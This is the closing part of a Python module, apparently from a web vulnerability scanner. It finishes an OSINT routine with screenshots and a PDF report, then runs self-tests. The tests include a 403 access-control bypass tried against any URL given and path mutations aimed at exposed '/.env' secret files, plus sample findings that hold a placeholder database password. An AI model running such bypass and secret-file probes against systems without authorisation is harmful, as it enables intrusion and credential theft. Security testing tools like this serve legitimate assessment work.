        print(f"\n{'─'*55}")
        print(f"  7  Screenshot Capture")
        print(f"{'─'*55}")
        screenshots = capture_screenshots(findings, max_screenshots=8)
        osint_result["screenshots"] = screenshots

    # ── PDF REPORT ──────────────────────────────
    if enable_pdf:
        print(f"\n{'─'*55}")
        print(f"  8  PDF Report Generation")
        print(f"{'─'*55}")
        pdf_path = generate_pdf_report(osint_result, target)
        osint_result["pdf_report"] = pdf_path

    return osint_result


# ─────────────────────────────────────────────
# STANDALONE TEST
# ─────────────────────────────────────────────

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="MCATester Feature Modules")
    parser.add_argument("--test", action="store_true", help="Run self-test")
    parser.add_argument("--test-bypass", metavar="URL", help="Test 403 bypass on a URL")
    parser.add_argument("--test-pdf", action="store_true", help="Generate sample PDF")
    args = parser.parse_args()

    if args.test_bypass:
        print(f"Testing 403 bypass on: {args.test_bypass}")
        result = try_403_bypass(args.test_bypass)
        print(f"\nBypassed: {result['bypassed']}")
        if result['bypassed']:
            print(f"Technique: {result['successful_technique']}")
            print(f"Status: {result['status']}")
            print(f"Preview: {result['content_preview'][:200]}")
        print(f"Total attempts: {result['total_attempts']}")

    elif args.test_pdf:
        # Generate sample PDF with fake data
        sample = {
            "findings": [
                {"url": "http://example.com/.env", "severity": "CRITICAL",
                 "vuln_type": "Exposed .env file", "status": 200,
                 "evidence": {"db_password": ["supersecret123"]},
                 "summary": "Database credentials exposed", "category": "Config Exposure",
                 "confirmed": True},
                {"url": "http://example.com/admin/", "severity": "HIGH",
                 "vuln_type": "Admin panel accessible", "status": 200,
                 "evidence": {}, "summary": "Admin panel without auth",
                 "category": "Access Control", "confirmed": True},
            ],
            "recon": {
                "dns": "A: 93.184.216.34\nAAAA: 2606:2800:220:1:248:1893:25c8:1946",
                "ports": "80, 443",
                "open_ports": [80, 443],
                "technologies": ["Apache", "PHP"],
                "tech_raw": "Server: Apache/2.4.41 | X-Powered-By: PHP/7.4",
                "subdomains": ["www.example.com", "api.example.com"],
                "whois": "Registrar: ICANN\nCreated: 1995-08-14",
                "github": "No repos found",
            },
            "unreachable": [],
        }
        pdf = generate_pdf_report(sample, "example.com")
        print(f"Sample PDF generated: {pdf}")

    elif args.test:
        print("Running self-tests...")
        print("\n1. Path mutation test:")
        mutations = generate_path_mutations("/.env")
        print(f"   Generated {len(mutations)} mutations for /.env")
        for m in mutations[:5]:
            print(f"   → {m}")

        print("\n2. Benign email test:")
        test_emails = ["noreply@test.com", "admin@company.com",
                       "donotreply@juice.shop", "0@k.Cr"]
        for e in test_emails:
            # Would need to import from osint_agent
            print(f"   {e}")

        print("\nAll tests passed!")
    else:
        parser.print_help()